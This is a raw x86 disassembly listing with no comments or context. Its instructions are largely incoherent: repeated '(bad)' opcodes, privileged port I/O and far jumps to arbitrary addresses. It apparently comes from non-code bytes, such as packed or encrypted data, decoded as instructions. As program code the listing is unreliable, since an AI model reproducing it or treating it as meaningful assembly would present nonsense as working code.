  41e13d:	int    0x5f
  41e13f:	imul   ebp,DWORD PTR [eax-0x33f1b99b],0x14d87564
  41e149:	setle  BYTE PTR cs:[edx+0x15]
  41e14e:	fidivr DWORD PTR [ecx+0x23a1b240]
  41e154:	sub    dl,bl
  41e156:	pop    edx
  41e157:	in     eax,dx
  41e158:	lods   eax,DWORD PTR ds:[esi]
  41e159:	call   DWORD PTR [esi+0x7dd68650]
  41e15f:	and    eax,0x84094a5
  41e164:	jge    0x41e123
  41e166:	push   cs
  41e167:	or     eax,0x252dbf00
  41e16c:	push   ds
  41e16d:	push   eax
  41e16e:	mov    DWORD PTR [ecx+0x116349bd],eax
  41e174:	pop    eax
  41e175:	xchg   ebx,eax
  41e176:	clc    
  41e177:	xor    DWORD PTR [esi+eiz*1-0x7e44ea29],esp
  41e17e:	popa   
  41e17f:	mov    ds:0x78122979,al
  41e184:	xor    eax,0x4ed82aaf
  41e189:	repz cmp ch,al
  41e18c:	mov    ds:0x9eefa94,eax
  41e191:	ficom  WORD PTR [ebp+0x61a90acb]
  41e197:	addr16 mov ebx,0x471374cf
  41e19d:	mov    esi,0xe03c1f26
  41e1a2:	mov    ds:0x9964a004,al
  41e1a7:	sbb    ch,al
  41e1a9:	and    DWORD PTR [edi+0x46eda7e1],ebp
  41e1af:	lds    edx,FWORD PTR [ebx-0x259c6e06]
  41e1b5:	or     DWORD PTR [eax+0x51],edi
  41e1b8:	dec    edx
  41e1b9:	or     eax,0xb5f959ec
  41e1be:	mov    esi,0xf881824f
  41e1c3:	lea    esp,[edi-0x7f]
  41e1c6:	pop    es
  41e1c7:	retf   0xe27b
  41e1ca:	scas   eax,DWORD PTR es:[edi]
  41e1cb:	inc    ebx
  41e1cc:	adc    esp,DWORD PTR [eax-0x65d87758]
  41e1d2:	pop    edi
  41e1d3:	adc    ecx,0x33
  41e1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d7:	daa    
  41e1d8:	(bad)  
  41e1d9:	loopne 0x41e15c
  41e1db:	es into 
  41e1dd:	sbb    BYTE PTR [ebx+0x41c11b9c],bl
  41e1e3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1e5:	jp     0x41e1a3
  41e1e7:	xchg   DWORD PTR [eax+0x6cdc861a],edi
  41e1ed:	cwde   
  41e1ee:	aam    0xf2
  41e1f0:	inc    ecx
  41e1f1:	mov    al,ds:0xeff7a008
  41e1f6:	mov    ebp,0x1f6ce00d
  41e1fb:	out    0xa7,eax
  41e1fd:	mov    ds:0x3f597557,eax
  41e202:	rcr    ecx,1
  41e204:	mov    bh,0xac
  41e206:	cmc    
  41e207:	cmp    ch,cl
  41e209:	pop    ds
  41e20a:	(bad)  
  41e20b:	pop    ecx
  41e20c:	ficom  DWORD PTR [ecx+ebp*4]
  41e20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e210:	xor    dl,BYTE PTR [ebx+ebp*4]
  41e213:	cwde   
  41e214:	icebp  
  41e215:	mov    edi,DWORD PTR [ecx]
  41e217:	gs dec esi
  41e219:	mov    bl,0x47
  41e21b:	mov    BYTE PTR [edi+0x7e0f96c9],cl
  41e221:	xlat   BYTE PTR ds:[ebx]
  41e222:	adc    eax,0x68c7c6dd
  41e227:	ss ret 
  41e229:	ficomp DWORD PTR [edi+ebx*2]
  41e22c:	cmp    al,ah
  41e22e:	and    DWORD PTR [edi-0x42],edx
  41e231:	je     0x41e26c
  41e233:	ja     0x41e1d0
  41e235:	add    BYTE PTR [edx+0x67],bh
  41e238:	jecxz  0x41e201
  41e23a:	sub    al,BYTE PTR [edx]
  41e23c:	ds ins BYTE PTR es:[edi],dx
  41e23e:	repnz add dh,bh
  41e241:	retf   
  41e242:	lods   eax,DWORD PTR ds:[esi]
  41e243:	clc    
  41e244:	in     eax,0x7a
  41e246:	sbb    DWORD PTR [edx-0x3c],ebp
  41e249:	xchg   esi,eax
  41e24a:	jmp    0x23f5:0xa30adc7e
  41e251:	jmp    0x41e281
  41e253:	pop    esi
  41e254:	pushf  
  41e255:	shl    DWORD PTR [edx-0x6f116c72],0x99
  41e25c:	mov    fs,WORD PTR [ecx+0x68]
  41e25f:	shl    edx,0xa8
  41e262:	sub    ebx,DWORD PTR [edx]
  41e264:	adc    al,0xa4
  41e266:	call   0x814e406c
  41e26b:	cmp    ch,dh
  41e26d:	mov    dh,0x30
  41e26f:	push   es
  41e270:	push   ebx
  41e271:	add    ch,BYTE PTR [edi-0x49]
  41e274:	cdq    
  41e275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e276:	pop    ebp
  41e277:	std    
  41e278:	cmp    al,0x54
  41e27a:	jmp    0xb2c9d876
  41e27f:	xor    al,0xf2
  41e281:	retf   0xf753
  41e284:	jnp    0x41e247
  41e286:	fidiv  DWORD PTR [ebx+0x1f3e85e9]
  41e28c:	lods   al,BYTE PTR ds:[esi]
  41e28d:	jmp    0x78df7a01
  41e292:	stos   BYTE PTR es:[edi],al
  41e293:	inc    ebp
  41e294:	shl    BYTE PTR [ebp-0xb69659e],cl
  41e29a:	pop    edx
  41e29b:	adc    al,0xae
  41e29d:	jmp    0x3c1f:0x2f7e8abf
  41e2a4:	cmp    ebp,ebp
  41e2a6:	int    0x30
  41e2a8:	and    dh,BYTE PTR [esi+0x69]
  41e2ab:	repz and esi,DWORD PTR [esi+0x18]
  41e2af:	dec    edx
  41e2b0:	in     eax,0x26
  41e2b2:	add    DWORD PTR [ebp+ecx*4-0xf],edi
  41e2b6:	xor    dl,BYTE PTR [edx+ebx*2-0x51]
  41e2ba:	and    eax,0xaa9b5f76
  41e2bf:	dec    esp
  41e2c0:	mov    esp,edx
  41e2c2:	mov    ebp,0xa565e9af
  41e2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2c8:	call   0xdbb618b0
  41e2cd:	imul   DWORD PTR [ebx+0x5b]
  41e2d0:	pushf  
  41e2d1:	in     eax,0x99
  41e2d3:	test   eax,0x2019ac68
  41e2d8:	xchg   esi,eax
  41e2d9:	lods   al,BYTE PTR ds:[esi]
  41e2da:	pushf  
  41e2db:	mov    ebp,0x9df26a5b
  41e2e0:	test   eax,0x6f2526c5
  41e2e5:	mov    ebx,0xdd862377
  41e2ea:	lahf   
  41e2eb:	push   cs
  41e2ec:	in     al,0xf7
  41e2ee:	scas   al,BYTE PTR es:[edi]
  41e2ef:	les    edx,FWORD PTR [ebp-0x2eefe25d]
  41e2f5:	xchg   esi,eax
  41e2f6:	cwde   
  41e2f7:	aad    0xb6
  41e2f9:	xor    esp,edx
  41e2fb:	jb     0x41e2a3
  41e2fd:	add    DWORD PTR [ecx+ebx*8+0x9ef5735],0x34
  41e305:	or     eax,0xe5542ccf
  41e30a:	jmp    0xc779:0xac369656
  41e311:	jmp    0x106c:0xef5d4caf
  41e318:	xlat   BYTE PTR ds:[ebx]
  41e319:	rcr    BYTE PTR [ebp+0x78ed5817],cl
  41e31f:	pop    ecx
  41e320:	push   cs
  41e321:	mov    ebp,0x28a868f0
  41e326:	jp     0x41e350
  41e328:	cmp    ebp,0x1c400edb
  41e32e:	add    al,0x7
  41e330:	out    0x1a,eax
  41e332:	jbe    0x41e336
  41e334:	cmp    DWORD PTR [ebx+0x63299512],edi
  41e33a:	mov    bl,0x1a
  41e33c:	jge    0x41e34e
  41e33e:	clc    
  41e33f:	lahf   
  41e340:	pop    ebp
  41e341:	add    edi,DWORD PTR [esi-0x4d7991d4]
  41e347:	ja     0x41e320
  41e349:	call   0xd6860bdb
  41e34e:	scas   eax,DWORD PTR es:[edi]
  41e34f:	cwde   
  41e350:	dec    ebx
  41e351:	in     al,dx
  41e352:	cmp    ch,0xf4
  41e355:	jg     0x41e33b
  41e357:	stos   DWORD PTR es:[edi],eax
  41e358:	sub    DWORD PTR [eax],esp
  41e35a:	mov    esp,0xb07d8e12
  41e35f:	js     0x41e32a
  41e361:	push   esp
  41e362:	pop    esp
  41e363:	in     al,0x42
  41e365:	push   cs
  41e366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e367:	sbb    BYTE PTR [esi+0x85013c1],bh
  41e36d:	ret    0x9d05
  41e370:	mov    esp,0xf4df4bd8
  41e375:	pusha  
  41e376:	popa   
  41e377:	rcr    BYTE PTR [esi-0x16],0x7
  41e37b:	clc    
  41e37c:	push   esi
  41e37d:	jmp    0x41e3b9
  41e37f:	fst    QWORD PTR [eax-0x34b9305d]
  41e385:	in     al,dx
  41e386:	push   eax
  41e387:	cs inc ebx
  41e389:	sbb    BYTE PTR [edx-0x77],ch
  41e38c:	retf   0xd0c1
  41e38f:	jae    0x41e3aa
  41e391:	cli    
  41e392:	pop    ebx
  41e393:	dec    eax
  41e394:	mov    ebp,0xcf6ed856
  41e399:	pop    esp
  41e39a:	mov    edx,0x526288d9
  41e39f:	jbe    0x41e3fa
  41e3a1:	xor    ah,BYTE PTR [ecx]
  41e3a3:	les    ecx,FWORD PTR [esi-0x6c5d2c5b]
  41e3a9:	push   ebp
  41e3aa:	int3   
  41e3ab:	rcr    dl,0x1f
  41e3ae:	ins    DWORD PTR es:[edi],dx
  41e3af:	cmc    
  41e3b0:	leave  
  41e3b1:	out    dx,eax
  41e3b2:	adc    eax,edi
  41e3b4:	mov    WORD PTR [ebx-0x6a],es
  41e3b7:	jmp    0x41e363
  41e3b9:	add    al,0x94
  41e3bb:	bswap  ecx
  41e3bd:	xchg   ebx,eax
  41e3be:	into   
  41e3bf:	mov    DWORD PTR [ebp-0x24],esp
  41e3c2:	mov    ds:0xb92e07ef,al
  41e3c7:	enter  0x210,0x86
  41e3cb:	sbb    DWORD PTR [ebx],esp
  41e3cd:	lds    esp,FWORD PTR [eax-0x7fc30cbb]
  41e3d3:	cli    
  41e3d4:	scas   al,BYTE PTR es:[edi]
  41e3d5:	out    dx,al
  41e3d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3d7:	ja     0x41e428
  41e3d9:	inc    eax
  41e3da:	inc    edi
  41e3db:	cmp    bh,BYTE PTR [edx-0x4f]
  41e3de:	push   ds
  41e3df:	mov    bl,0xd2
  41e3e1:	or     eax,0xa765461b
  41e3e6:	scas   eax,DWORD PTR es:[edi]
  41e3e7:	sbb    al,0xbf
  41e3e9:	mov    al,0x76
  41e3eb:	and    eax,0xf892416b
  41e3f0:	retf   0x2fc9
  41e3f3:	scas   al,BYTE PTR es:[edi]
  41e3f4:	mov    ecx,DWORD PTR [eax]
  41e3f6:	fwait
  41e3f7:	mov    eax,ds:0x95189f2c
  41e3fc:	mov    edi,0x4b7a9862
  41e401:	push   ebp
  41e402:	lods   eax,DWORD PTR ds:[esi]
  41e403:	ins    BYTE PTR es:[edi],dx
  41e404:	lds    ebp,FWORD PTR [esi+edx*1-0x4e84c392]
  41e40b:	mov    cl,BYTE PTR [ebx-0x6b40f7ba]
  41e411:	shr    DWORD PTR [ecx],cl
  41e413:	ja     0x41e3c1
  41e415:	jno    0x41e422
  41e417:	inc    ecx
  41e418:	pop    es
  41e419:	xchg   DWORD PTR [ebx-0x5ebb8f80],esp
  41e41f:	ins    DWORD PTR es:[edi],dx
  41e420:	jmp    0x41e47f
  41e422:	push   ds
  41e423:	inc    ebx
  41e424:	mov    eax,ds:0x66798024
  41e429:	pop    dx
  41e42b:	push   edx
  41e42c:	(bad)  
  41e42d:	scas   eax,DWORD PTR es:[edi]
  41e42e:	sbb    al,0xca
  41e430:	jl     0x41e3fd
  41e432:	out    0x5e,eax
  41e434:	lods   al,BYTE PTR ds:[esi]
  41e435:	sbb    ebx,DWORD PTR [edi+0x169c32d5]
  41e43b:	xchg   BYTE PTR [eax+0x78be4247],ah
  41e441:	jb     0x41e4b3
  41e443:	outs   dx,BYTE PTR ds:[esi]
  41e444:	push   cs
  41e445:	fwait
  41e446:	inc    ecx
  41e447:	fld    QWORD PTR ds:0xc66b5297
  41e44d:	push   0x34
  41e44f:	cmp    ch,BYTE PTR [edx+0x55]
  41e452:	add    ecx,DWORD PTR ds:0xffe892c3
  41e458:	scas   al,BYTE PTR es:[edi]
  41e459:	fldenv [esi-0x70fbe925]
  41e45f:	cld    
  41e460:	test   DWORD PTR [esi-0x7cc75a1d],eax
  41e466:	inc    esp
  41e467:	add    eax,ebp
  41e469:	je     0x41e3f1
  41e46b:	push   ss
  41e46c:	(bad)  
  41e46d:	jmp    0x8f7cfdf8
  41e472:	mov    esp,0x38263228
  41e477:	fild   QWORD PTR [esi-0x7ea7d18]
  41e47d:	out    0x16,al
  41e47f:	in     eax,0x92
  41e481:	mov    DWORD PTR [ecx],ebx
  41e483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e484:	mov    dh,0x34
  41e486:	xchg   DWORD PTR [edx-0x27],ecx
  41e489:	or     bh,BYTE PTR [ecx]
  41e48b:	jns    0x41e471
  41e48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e48e:	scas   eax,DWORD PTR es:[edi]
  41e48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e490:	lock popa 
  41e492:	mov    ecx,DWORD PTR [ebp+esi*1+0x4fae1174]
  41e499:	loop   0x41e4d3
  41e49b:	pushf  
  41e49c:	xor    ebx,DWORD PTR [esi+0x7a2b9945]
  41e4a2:	and    DWORD PTR [edx-0xe0f6bba],esp
  41e4a8:	xor    BYTE PTR [ecx],al
  41e4aa:	(bad)  
  41e4ab:	add    eax,DWORD PTR [ecx+0xce8c773]
  41e4b1:	mov    bl,BYTE PTR [edx]
  41e4b3:	mov    esp,0x21a1d682
  41e4b8:	fnstsw WORD PTR [esi+edi*8]
  41e4bb:	imul   ecx,esp,0x3ea348b2
  41e4c1:	imul   eax,DWORD PTR [ecx],0x95b67559
  41e4c7:	das    
  41e4c8:	popa   
  41e4c9:	dec    ebp
  41e4ca:	(bad)  [edi-0x466d89b]
  41e4d0:	(bad)  
  41e4d1:	jp     0x41e4fa
  41e4d3:	add    al,0xb4
  41e4d5:	(bad)
  41e4d8:	(bad)
  41e4db:	and    al,dh
  41e4dd:	aam    0xc8
  41e4df:	xchg   ebp,eax
  41e4e0:	dec    ebx
  41e4e1:	and    al,0x49
  41e4e3:	push   cs
  41e4e4:	in     al,dx
  41e4e5:	cli    
  41e4e6:	les    edx,FWORD PTR [edx]
  41e4e8:	fld    TBYTE PTR [ecx]
  41e4ea:	icebp  
  41e4eb:	out    0x63,eax
  41e4ed:	inc    edx
  41e4ee:	imul   BYTE PTR [ecx-0x77]
  41e4f1:	adc    DWORD PTR [esi-0x6f],0xf6477345
  41e4f8:	mov    ebx,0x69992cac
  41e4fd:	imul   esi,DWORD PTR [edx+0x746cdbf6],0x7d290f9c
  41e507:	scas   al,BYTE PTR es:[edi]
  41e508:	xor    dl,BYTE PTR [ebx+0x465fcd1a]
  41e50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e50f:	jl     0x41e538
  41e511:	pusha  
  41e512:	cmp    eax,DWORD PTR [esi-0x711cbef0]
  41e518:	dec    ecx
  41e519:	jmp    0x41e586
  41e51b:	xlat   BYTE PTR ds:[ebx]
  41e51c:	jp     0x41e582
  41e51e:	ins    BYTE PTR es:[edi],dx
  41e51f:	xchg   ecx,eax
  41e520:	or     bh,BYTE PTR [esi-0x27]
  41e523:	push   0x9c3825d8
  41e528:	inc    esp
  41e529:	clc    
  41e52a:	into   
  41e52b:	repz and BYTE PTR [ecx-0x31],ah
  41e52f:	add    DWORD PTR [ecx],ebp
  41e531:	fcom   DWORD PTR [edi-0x1ab200d]
  41e537:	imul   edi,DWORD PTR [ebp-0x4fe8b198],0xffffffb2
  41e53e:	jg     0x41e4d0
  41e540:	cmp    ah,BYTE PTR [edi]
  41e542:	cmp    eax,0xa2eeef71
  41e547:	loope  0x41e4ee
  41e549:	bound  esi,QWORD PTR [ebx-0x58fa8ac2]
  41e54f:	in     al,dx
  41e550:	sub    ebp,esi
  41e552:	in     eax,0xc3
  41e554:	popa   
  41e555:	in     al,dx
  41e556:	enter  0x9e97,0x5f
  41e55a:	sbb    BYTE PTR [ebp+0x76],dh
  41e55d:	xor    BYTE PTR [ecx],bh
  41e55f:	mov    ds:0x95b923e7,eax
  41e564:	jecxz  0x41e549
  41e566:	sub    BYTE PTR [ebx-0x318f387d],ch
  41e56c:	xor    DWORD PTR [esi],ecx
  41e56e:	push   esi
  41e56f:	xor    DWORD PTR [edx-0xb],0xff8e1c51
  41e576:	pop    ecx
  41e577:	in     eax,dx
  41e578:	dec    edx
  41e579:	and    BYTE PTR [edi-0xf],0xf9
  41e57d:	retf   0x9b72
  41e580:	cmc    
  41e581:	cmp    ah,BYTE PTR [ebx+0x27a1d443]
  41e587:	ret    0xd4d
  41e58a:	push   ebp
  41e58b:	sbb    al,0x72
  41e58d:	and    BYTE PTR [ecx+0x70c48e02],al
  41e593:	cdq    
  41e594:	jl     0x41e5af
  41e596:	push   edi
  41e597:	sbb    DWORD PTR [esp+ecx*8],eax
  41e59a:	jmp    0x3499:0x9d30dea9
  41e5a1:	enter  0x7a5b,0xc6
  41e5a5:	pop    ds
  41e5a6:	push   edi
  41e5a7:	dec    esi
  41e5a8:	(bad)  
  41e5a9:	push   edx
  41e5aa:	sbb    ch,BYTE PTR [eax-0x26]
  41e5ad:	dec    esi
  41e5ae:	xchg   edx,eax
  41e5af:	ret    
  41e5b0:	sbb    bh,cl
  41e5b2:	aad    0x42
  41e5b4:	out    0x86,al
  41e5b6:	aas    
  41e5b7:	jne    0x41e62a
  41e5b9:	cli    
  41e5ba:	fxch   st(1)
  41e5bc:	(bad)
  41e5bf:	stc    
  41e5c0:	rcl    DWORD PTR [edx],0x57
  41e5c3:	jp     0x41e629
  41e5c5:	jle    0x41e59d
  41e5c7:	aaa    
  41e5c8:	cmp    esp,DWORD PTR [ebx+0x28]
  41e5cb:	push   ecx
  41e5cc:	test   eax,0x57136025
  41e5d1:	inc    esp
  41e5d2:	test   BYTE PTR [ecx],0x1b
  41e5d5:	aam    0x13
  41e5d7:	mov    al,0xd0
  41e5d9:	pop    ds
  41e5da:	daa    
  41e5db:	aaa    
  41e5dc:	and    DWORD PTR [esi-0xd],ebx
  41e5df:	loope  0x41e5b8
  41e5e1:	add    ebp,DWORD PTR [esi-0xcc52cf]
  41e5e7:	mov    al,0x37
  41e5e9:	jne    0x41e584
  41e5eb:	je     0x41e5b5
  41e5ed:	jg     0x41e5ae
  41e5ef:	or     bl,BYTE PTR [ecx]
  41e5f1:	sbb    edx,DWORD PTR [eax+0x65]
  41e5f4:	jg     0x41e5f9
  41e5f6:	xlat   BYTE PTR ds:[ebx]
  41e5f7:	mov    ebp,0x34bca859
  41e5fc:	fnstsw WORD PTR ds:0x38370c9e
  41e602:	jb     0x41e62e
  41e604:	test   esp,ebp
  41e606:	test   al,0xe9
  41e608:	push   ebx
  41e609:	rcl    DWORD PTR [ebx],cl
  41e60b:	icebp  
  41e60c:	jb     0x41e617
  41e60e:	pop    ecx
  41e60f:	sbb    edx,edi
  41e611:	scas   eax,DWORD PTR es:[edi]
  41e612:	psrlw  mm6,QWORD PTR [edx]
  41e615:	iret   
  41e616:	adc    eax,0x6c3eb26a
  41e61b:	in     al,0xb1
  41e61d:	mov    eax,0x8cfa68e0
  41e622:	pusha  
  41e623:	outs   dx,DWORD PTR ds:[esi]
  41e624:	xchg   DWORD PTR [edi-0x27ce15a1],ecx
  41e62a:	nop
  41e62b:	cmp    eax,0x3ca86a59
  41e630:	in     eax,0x36
  41e632:	mov    bh,0x9
  41e634:	clc    
  41e635:	mov    eax,ds:0x8da35dc2
  41e63a:	sub    ah,BYTE PTR [esi]
  41e63c:	retf   0x3167
  41e63f:	into   
  41e640:	stc    
  41e641:	fld    QWORD PTR ds:0x68cd2730
  41e647:	outs   dx,DWORD PTR ds:[esi]
  41e648:	xor    BYTE PTR [ebp+0x41],0xd5
  41e64c:	dec    esp
  41e64d:	sbb    dl,BYTE PTR [ebx]
  41e64f:	inc    ecx
  41e650:	lock test eax,0x4c5dcdda
  41e656:	add    edi,DWORD PTR es:[ecx+edx*4-0x9]
  41e65b:	and    cl,BYTE PTR [edi-0x3d]
  41e65e:	rcl    DWORD PTR [edx+eax*2-0x1fea9f3a],cl
  41e665:	das    
  41e666:	pop    ds
  41e667:	dec    esp
  41e668:	mov    ch,0xdb
  41e66a:	cli    
  41e66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e66c:	jbe    0x41e676
  41e66e:	mov    al,ds:0x4480afa4
  41e673:	out    0x49,al
  41e675:	mov    eax,0xc3a06eaf
  41e67a:	lahf   
  41e67b:	out    dx,al
  41e67c:	mov    dh,0xae
  41e67e:	mul    BYTE PTR [edi-0x62]
  41e681:	adc    ebx,DWORD PTR [esi]
  41e683:	pop    ebp
  41e684:	iret   
  41e685:	stos   BYTE PTR es:[edi],al
  41e686:	lds    edx,FWORD PTR [edi+0x21049be]
  41e68c:	in     eax,0x7e
  41e68e:	pop    edx
  41e68f:	jge    0x41e6ae
  41e691:	js     0x41e63c
  41e693:	(bad)  
  41e694:	retf   
  41e695:	mov    ecx,eax
  41e697:	stos   DWORD PTR es:[edi],eax
  41e698:	mov    dl,BYTE PTR [ecx+0x6da16e85]
  41e69e:	push   0xffffff99
  41e6a0:	div    DWORD PTR [ecx]
  41e6a2:	mov    edi,0x51bf6439
  41e6a7:	fisttp WORD PTR ds:0xb8dbd329
  41e6ad:	mov    ah,0x88
  41e6af:	mov    ah,0xa0
  41e6b1:	(bad)  
  41e6b2:	fldenv [ebx+0x492c9ae4]
  41e6b8:	jg     0x41e6e7
  41e6ba:	das    
  41e6bb:	or     bl,cl
  41e6bd:	retf   
  41e6be:	xor    al,0xe1
  41e6c0:	adc    BYTE PTR [ebp+0x50],bl
  41e6c3:	mov    edi,0xfc390100
  41e6c8:	pop    ecx
  41e6c9:	xor    DWORD PTR [eax-0x80],edi
  41e6cc:	and    ecx,DWORD PTR [edi-0x7eefef79]
  41e6d2:	add    DWORD PTR [eax-0x40347c0e],edi
  41e6d8:	fisubr DWORD PTR [edi]
  41e6da:	dec    esi
  41e6db:	jp     0x41e724
  41e6dd:	mov    edx,0xba7d10a1
  41e6e2:	ret    0xc904
  41e6e5:	inc    ecx
  41e6e6:	ret    
  41e6e7:	lods   al,BYTE PTR ds:[esi]
  41e6e8:	pop    ebp
  41e6e9:	inc    ebx
  41e6ea:	mov    WORD PTR [ebp-0x6f],bp
  41e6ee:	push   0xffffffa2
  41e6f0:	sub    ebx,DWORD PTR [eax]
  41e6f2:	pop    edi
  41e6f3:	sti    
  41e6f4:	xor    DWORD PTR [ebx+0x4d],ebp
  41e6f7:	hlt    
  41e6f8:	jne    0x41e6cd
  41e6fa:	mov    dh,0x96
  41e6fc:	inc    esp
  41e6fd:	jmp    0x41e6e0
  41e6ff:	icebp  
  41e700:	jbe    0x41e6d8
  41e702:	bound  ecx,QWORD PTR [ebx+0xb]
  41e705:	jle    0x41e776
  41e707:	cmp    BYTE PTR [ebx-0x37],bh
  41e70a:	scas   eax,DWORD PTR es:[edi]
  41e70b:	adc    BYTE PTR [eax],bh
  41e70d:	xor    esi,DWORD PTR [ecx+0xc]
  41e710:	(bad)  [edx]
  41e712:	sbb    esp,ebx
  41e714:	cmp    edi,DWORD PTR [eax-0x3a]
  41e717:	adc    ah,BYTE PTR [eax-0x43]
  41e71a:	pushf  
  41e71b:	sub    edx,edi
  41e71d:	pop    es
  41e71e:	inc    esp
  41e71f:	pop    eax
  41e720:	imul   ebx,ecx,0x3e15ce3f
  41e726:	pop    ecx
  41e727:	or     eax,0xdb9b321c
  41e72c:	(bad)  
  41e72d:	jb     0x41e715
  41e72f:	push   edx
  41e730:	std    
  41e731:	push   ss
  41e732:	ins    DWORD PTR es:[edi],dx
  41e733:	mov    ebp,cs
  41e735:	test   al,0xeb
  41e737:	sbb    dh,ah
  41e739:	inc    edx
  41e73a:	jp     0x41e6c9
  41e73c:	dec    ebx
  41e73d:	es jno 0x41e7be
  41e740:	dec    ecx
  41e741:	xor    ebx,DWORD PTR [ebx]
  41e743:	ds es cwde 
  41e746:	xor    al,0x2f
  41e748:	aaa    
  41e749:	cdq    
  41e74a:	cmp    ebp,ecx
  41e74c:	mov    edi,0x35f64328
  41e751:	psraw  mm5,mm6
  41e754:	mov    WORD PTR [esi+eiz*8+0x16],fs
  41e758:	call   0xcb43:0x66b72f3
  41e75f:	push   ds
  41e760:	push   ecx
  41e761:	scas   eax,DWORD PTR es:[edi]
  41e762:	stos   DWORD PTR es:[edi],eax
  41e763:	mov    esp,0xbb293c6c
  41e768:	mov    DWORD PTR [edi],ebx
  41e76a:	int    0xec
  41e76c:	addr16 pop es
  41e76e:	inc    edx
  41e76f:	nop
  41e770:	and    esp,edi
  41e772:	sub    BYTE PTR [ecx],al
  41e774:	mov    ecx,0x2ad0e9e0
  41e779:	mov    DWORD PTR [esi-0x635abccd],ecx
  41e77f:	ror    al,1
  41e781:	nop
  41e782:	outs   dx,BYTE PTR ds:[esi]
  41e783:	enter  0xcb27,0x3a
  41e787:	mov    bh,0xd0
  41e789:	xor    al,0x63
  41e78b:	cld    
  41e78c:	fdiv   st(0),st
  41e78e:	xchg   di,ax
  41e790:	iret   
  41e791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e792:	ins    BYTE PTR es:[edi],dx
  41e793:	dec    edi
  41e794:	pop    ds
  41e795:	pop    ds
  41e796:	aas    
  41e797:	lahf   
  41e798:	jg     0x41e7e2
  41e79a:	or     bl,BYTE PTR [ecx-0x1a54ffb3]
  41e7a0:	hlt    
  41e7a1:	cmp    eax,0x7fbb0ded
  41e7a6:	xchg   edx,eax
  41e7a7:	into   
  41e7a8:	jo     0x41e738
  41e7aa:	xchg   esp,eax
  41e7ab:	mov    cs,WORD PTR [esi-0x18]
  41e7ae:	mov    bh,0x26
  41e7b0:	gs sub eax,0xcf3e95de
  41e7b6:	and    ebx,DWORD PTR [edx]
  41e7b8:	add    dh,cl
  41e7ba:	xor    eax,0xcdbc0fa4
  41e7bf:	clc    
  41e7c0:	xor    eax,0x721442e5
  41e7c5:	rcl    BYTE PTR ds:0x47345b74,0x61
  41e7cc:	leave  
  41e7cd:	fwait
  41e7ce:	test   al,0xd5
  41e7d0:	mov    ch,0x4b
  41e7d2:	aaa    
  41e7d3:	int3   
  41e7d4:	into   
  41e7d5:	sub    al,0x7b
  41e7d7:	and    edi,DWORD PTR [esi]
  41e7d9:	retf   
  41e7da:	cwde   
  41e7db:	cmp    al,0xcc
  41e7dd:	or     DWORD PTR [edx+0x57dde41e],esp
  41e7e3:	out    0xd2,eax
  41e7e5:	pop    esi
  41e7e6:	dec    edi
  41e7e7:	ret    0xc5a1
  41e7ea:	push   edi
  41e7eb:	in     al,0xfd
  41e7ed:	lds    ebx,FWORD PTR [ebx]
  41e7ef:	inc    ebp
  41e7f0:	(bad)  
  41e7f1:	mov    DWORD PTR [esp+edx*2],ebx
  41e7f4:	iret   
  41e7f5:	jne    0x41e83c
  41e7f7:	sar    esi,0x97
  41e7fa:	test   BYTE PTR [esi+ebx*1],cl
  41e7fd:	adc    ch,0x29
  41e800:	add    eax,0x704ee60e
  41e805:	xchg   ebp,eax
  41e806:	mov    edi,0x2bd94552
  41e80b:	mov    ebx,0x2091a0ce
  41e810:	mov    dl,0x91
  41e812:	lock (bad) 
  41e814:	aaa    
  41e815:	arpl   WORD PTR [ebp-0x6],di
  41e818:	ds pop ds
  41e81a:	mov    ds:0x240f7f7d,al
  41e81f:	xchg   bh,al
  41e821:	mov    dl,0xdc
  41e823:	sbb    eax,0x3787ca94
  41e828:	or     al,0x90
  41e82a:	test   al,0xe8
  41e82c:	cs popa 
  41e82e:	pushf  
  41e82f:	daa    
  41e830:	mov    cx,0xb1e5
  41e834:	pop    esp
  41e835:	test   BYTE PTR [ecx-0x68b69b8],0x21
  41e83c:	in     al,dx
  41e83d:	std    
  41e83e:	cmp    al,0x64
  41e840:	cs jb  0x41e812
  41e843:	test   eax,0x4041d154
  41e848:	rcl    esi,cl
  41e84a:	or     eax,0xe19e06fb
  41e84f:	mov    ebp,0x1de26daf
  41e854:	ins    BYTE PTR es:[edi],dx
  41e855:	data16 in al,dx
  41e857:	pop    eax
  41e858:	test   DWORD PTR [esi-0x34],ebx
  41e85b:	dec    edi
  41e85c:	inc    esi
  41e85d:	ss fwait
  41e85f:	lahf   
  41e860:	gs push edi
  41e862:	inc    ebp
  41e863:	out    dx,al
  41e864:	jl     0x41e8a8
  41e866:	ins    DWORD PTR es:[edi],dx
  41e867:	imul   ecx,DWORD PTR [eax],0x5b
  41e86a:	and    dl,0xe0
  41e86d:	adc    esp,DWORD PTR [edx]
  41e86f:	mov    ch,0xa0
  41e871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e872:	dec    esi
  41e873:	jnp    0x41e832
  41e875:	das    
  41e876:	addr16 mov eax,ds:0x6a6
  41e87a:	fsubr  QWORD PTR [eax-0x2d]
  41e87d:	mov    BYTE PTR [edi-0x2e],ch
  41e880:	inc    edi
  41e881:	add    DWORD PTR [edi+0x8],edx
  41e884:	mov    WORD PTR [edx],es
  41e886:	(bad)  
  41e887:	rol    BYTE PTR [ebp-0x755fa7b8],0xb7
  41e88e:	xlat   BYTE PTR ds:[ebx]
  41e88f:	dec    esp
  41e890:	(bad)  
  41e892:	or     BYTE PTR [eax],0x7a
  41e895:	add    eax,DWORD PTR [edx+0x50c5ea47]
  41e89b:	mov    edi,0xed0ad3c5
  41e8a0:	mov    DWORD PTR [eax],edx
  41e8a2:	iret   
  41e8a3:	aas    
  41e8a4:	mov    bh,0xc1
  41e8a6:	ins    DWORD PTR es:[edi],dx
